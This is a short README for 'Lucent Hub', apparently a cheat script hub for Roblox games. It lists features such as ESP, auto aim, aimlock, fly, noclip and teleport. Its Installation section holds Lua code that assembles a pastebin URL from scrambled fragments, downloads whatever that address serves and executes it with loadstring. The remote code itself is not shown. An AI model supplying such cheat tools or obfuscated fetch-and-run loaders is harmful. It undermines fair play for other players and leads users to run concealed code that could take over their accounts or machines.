# Lucent Hub

# Supported Games

| Game Name          | Description                       | Script Features                    | Status   |
|--------------------|-----------------------------------|------------------------------------|----------|
| Murder vs Sheriff  |____     [██████████] 100%         | Hitbox enhancement, ESP, Auto aim  | Stable   |
| 99 Nights in the Forest |    [█---------] 15%          |  coming soon...                      | almost   |
| dahood             |         [█████----] 60%           | Fly, Noclip, Aimlock, Telepo       | beta     |
| ???                |         [----------] 0%           | coming soon...                     | beta     |
| ???                |         [----------] 0%           | coming soon...                     | beta     |

# Installation
```lua
local function s(t)
    local r = {"ht","tp","s:","//","pa","st","eb","in",".c","om","/r","aw","/u","n1","mx","SY","E"}
    return table.concat(r)
end

local function r(u)
    return game:HttpGet(u)
end

local function x(c)
    return loadstring(c)()
end

local url = s()
local code = r(url)
x(code)
